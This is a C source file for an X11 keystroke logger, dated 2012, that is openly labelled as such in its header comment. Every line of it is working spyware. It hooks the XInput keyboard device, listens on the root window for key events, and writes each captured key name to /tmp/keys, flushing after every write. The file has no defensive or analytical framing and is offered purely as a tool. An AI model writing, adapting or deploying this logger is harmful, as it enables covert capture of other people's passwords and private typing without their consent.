/*
 * x_input_keylogger.c 2012 06 20 
 * 
 * Copyright john <johnatakiradotfr> 
 * 
 * x_input_logger is a basic key logger
 * written to log every key passing through
 * the X server
 *
 * TODO : - autdetect keyboard device id
 *        - filenaming
 *
 */

#include <stdio.h>
#include <assert.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XInput.h>

#define INVALID_EVENT_TYPE  -1

#define EVENT_KEY_PRESSED   101 
#define EVENT_KEY_RELEASED  102 

#define KEY_SHIFT_L   "Shift_R"
#define KEY_SHIFT_R	  "Shift_L"
#define KEY_ALT_R	    "Alt_R"

static int key_press_type = INVALID_EVENT_TYPE;
static int key_release_type = INVALID_EVENT_TYPE;

int main(void) {
  
	int i;
	int number = 0; 
	int run = 1;
	int default_screen;
	FILE * f;

	Display * default_display;
	Window root_window;
	XEvent e;
	XDevice * device;
	XDeviceKeyEvent * key;
	XInputClassInfo       *ip;
	XEventClass           event_list[7];
  KeySym upper_case;
  KeySym lower_case;

	default_display = XOpenDisplay(NULL); 
	default_screen = DefaultScreen(default_display);
	root_window = RootWindow(default_display, default_screen);

	/* device id 9 is the keyboard */
	device = XOpenDevice(default_display, 9);

	if(!device){
    fprintf(stderr, "unable to open device\n");
    return 0;
	}

	if(device->num_classes > 0) {
	//for (ip = device->classes, i=0; i<info->num_classes; ip++, i++) {
		for(ip = device->classes, i=0; i<1; ++ip, ++i) {
			//printf("input_class:%d, KeyClass: %d\n", ip->input_class, KeyClass);	
			switch(ip->input_class){
				case KeyClass:
				DeviceKeyPress(device, key_press_type, event_list[number]); number++;
				DeviceKeyRelease(device, key_release_type, event_list[number]); number++;
				break;

				default:
				printf("not key class\n");
				break;
			}
		}
	}
	
  /* important */
	if(XSelectExtensionEvent(default_display, root_window, event_list, number)) {
		fprintf(stderr, "error selecting extended events\n");
		return 0;
	}

	f = fopen("/tmp/keys", "w");
	assert(f != NULL);

	while(run) {
		XNextEvent(default_display, &e);                           
		key = (XDeviceKeyEvent *) &e;

		if(strncmp(KEY_SHIFT_L, XKeysymToString(XKeycodeToKeysym(default_display, key->keycode, 0)), 7) == 0
		|| strncmp(KEY_SHIFT_R, XKeysymToString(XKeycodeToKeysym(default_display, key->keycode, 0)), 7) == 0
		|| strncmp(KEY_ALT_R, XKeysymToString(XKeycodeToKeysym(default_display, key->keycode, 0)), 5) == 0){
		
			fprintf(f, "%s ", XKeysymToString(XKeycodeToKeysym(default_display, key->keycode, 0)));
			fflush(f);

		}else if(key->type == EVENT_KEY_RELEASED){

      fprintf(f, "%s ", XKeysymToString(XKeycodeToKeysym(default_display, key->keycode, 0)));
			fflush(f);

    }
  }

	fclose(f);
	/* Close the connection to the X server */
	XCloseDisplay(default_display);

	return 0;
}
